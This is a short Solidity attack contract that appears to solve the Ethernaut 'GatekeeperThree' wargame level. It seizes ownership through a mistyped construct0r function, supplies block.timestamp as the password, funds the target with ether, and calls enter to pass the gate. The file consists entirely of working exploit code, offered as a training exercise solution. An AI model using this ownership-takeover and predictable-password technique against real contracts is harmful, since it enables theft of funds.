// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperThree {
	function construct0r() external;
	function getAllowance(uint256 _password) external;
	function createTrick() external;
	function enter() external;
}

contract Hack {
	GatekeeperThree gate;

	constructor(address _gate) payable {
		if (msg.value < 0.001 ether) revert("Insufficient funding !");
		gate = GatekeeperThree(payable(_gate));
	}

	function attack() public {
		// SimpleTrick trick;
		gate.construct0r();
		gate.createTrick();
		// trick = SimpleTrick(gate.trick());
		gate.getAllowance(block.timestamp);
		(bool success, ) = payable(address(gate)).call{value: 0.0015 ether}("");
		require(success, "Sending ether not ok!");
		gate.enter();
	}

}